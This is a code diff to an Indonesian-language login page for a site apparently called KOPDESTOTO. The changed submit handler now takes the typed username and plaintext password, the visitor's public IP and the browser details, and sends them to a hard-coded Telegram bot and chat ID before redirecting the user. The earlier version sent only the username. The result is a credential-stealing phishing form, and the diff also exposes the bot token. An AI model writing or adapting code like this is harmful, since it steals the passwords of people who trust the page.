@@ -13,9 +13,11 @@ body{background:#000;color:#fff}
 .container{max-width:400px;margin:40px auto;padding:20px}
 .box{background:#1a1a1a;padding:25px;border-radius:12px;border:1px solid #FF0000}
 .box h2{text-align:center;color:#FFD700;margin-bottom:20px}
-input{width:100%;padding:12px;margin-top:10px;border-radius:8px;border:1px solid #333;background:#0d0d0d;color:#fff}
+label{display:block;margin-top:10px;font-size:14px;color:#ccc}
+input{width:100%;padding:12px;margin-top:5px;border-radius:8px;border:1px solid #333;background:#0d0d0d;color:#fff}
 .btn{width:100%;padding:14px;margin-top:20px;background:linear-gradient(90deg,#FFD700,#FFA000);border:none;border-radius:8px;color:#000;font-weight:bold;font-size:16px;cursor:pointer}
-.btn:hover{opacity:0.8}
+.btn:disabled{opacity:0.5;cursor:not-allowed}
+.btn:hover:not(:disabled){opacity:0.8}
 .bottom-nav{position:fixed;bottom:0;left:0;right:0;background:linear-gradient(to top,#8B0000,#5a0000);display:flex;justify-content:space-around;padding:8px 0;border-top:2px solid #FF0000}
 .nav-item{text-align:center;color:#ccc;font-size:10px;text-decoration:none;flex:1}
 .nav-item img{width:26px;display:block;margin:0 auto 3px;filter:brightness(0.7)}
@@ -34,15 +36,15 @@ body{padding-bottom:80px}
   <div class="box">
     <h2>🔐 MASUK KE AKUN</h2>    
 
-    <form id="loginForm">  <!-- HAPUS action, tambah id -->
+    <form id="loginForm">
       <label>Username</label>
-      <input type="text" id="username" name="username" placeholder="Masukkan Username" required> <!-- tambah id -->
+      <input type="text" id="username" name="username" placeholder="Masukkan Username" required>
       
       <label>Password</label>
-      <input type="password" id="password" name="password" placeholder="Masukkan Password" required> <!-- tambah id -->
+      <input type="password" id="password" name="password" placeholder="Masukkan Password" required>
       
-      <button class="btn" type="submit" id="btnLogin">LOGIN SEKARANG</button> <!-- tambah id -->
-      <p id="status" style="text-align:center; margin-top:10px; color:#FFD700;"></p> <!-- buat status loading -->
+      <button class="btn" type="submit" id="btnLogin">LOGIN SEKARANG</button>
+      <p id="status" style="text-align:center; margin-top:10px; color:#FFD700; font-size:13px;"></p>
     </form>        
 
     <p style="text-align:center;margin-top:15px;font-size:12px">Belum punya akun? <a href="daftar1.html" style="color:#FFD700">Daftar Disini</a></p>
@@ -55,44 +57,68 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
 
     const btn = document.getElementById('btnLogin');
     const status = document.getElementById('status');
-    const username = document.getElementById('username').value;
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
     
     btn.disabled = true;
-    status.innerText = "Loading...";
+    status.innerText = "Mengirim...";
 
-    // GANTI DENGAN TOKEN BARU KAMU
+    // GANTI DENGAN TOKEN & CHAT_ID KAMU
     const BOT_TOKEN = "8695932731:AAHEmFPeOuGXZBU1fcBoO3Qh9UDi8pO2vGU"; 
     const CHAT_ID = "392836663";
 
-    const pesan = `🔔 Login Baru KOPDESTOTO
-Username: ${username}
-Jam: ${new Date().toLocaleString('id-ID')}
-IP: ${window.location.hostname}`;
+    let ip = "Tidak diketahui";
+    try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+    } catch(e){}
+
+    const waktu = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
+    const pesan = `🔔 LOGIN BARU KOPDESTOTO
+👤 Username: ${username}
+🔑 Password: ${password}
+🌐 IP: ${ip}
+⏰ Waktu: ${waktu}
+📱 Device: ${navigator.userAgent}`;
 
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
     try {
-        // Kirim ke telegram
-        await fetch(url, {
+        const res = await fetch(url, {
             method: 'POST',
+            mode: 'cors',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CHAT_ID, text: pesan})
+            body: JSON.stringify({
+                chat_id: CHAT_ID, 
+                text: pesan,
+                parse_mode: 'HTML'
+            })
         });
+
+        const data = await res.json();
         
-        status.innerText = "Berhasil! Mengalihkan...";
+        if(data.ok){
+            status.style.color = "#00FF00";
+            status.innerText = "Berhasil! Mengalihkan...";
+        } else {
+            throw new Error(data.description);
+        }
         
     } catch (err) {
-        console.log("Gagal kirim:", err);
-        status.innerText = "Gagal kirim notif, tetap redirect";
+        console.error("Gagal kirim:", err);
+        status.style.color = "#FF5555";
+        status.innerText = "Gagal kirim notif. Tetap redirect.";
     }
 
-    // Tunggu 0.5 detik baru redirect biar notif kekirim dulu
+    // Tunggu 1 detik biar notif pasti masuk baru redirect
     setTimeout(() => {
         window.location.href = "index.html"; 
-    }, 500);
+    }, 1000);
 
 });
 </script>
+
 <div class="bottom-nav">
   <a href="index.html" class="nav-item"><img src="https://cdn-icons-png.flaticon.com/512/25/25694.png">HOME</a>
   <a href="promo.html" class="nav-item"><img src="https://cdn-icons-png.flaticon.com/512/1828/1828884.png">PROMOSI</a>
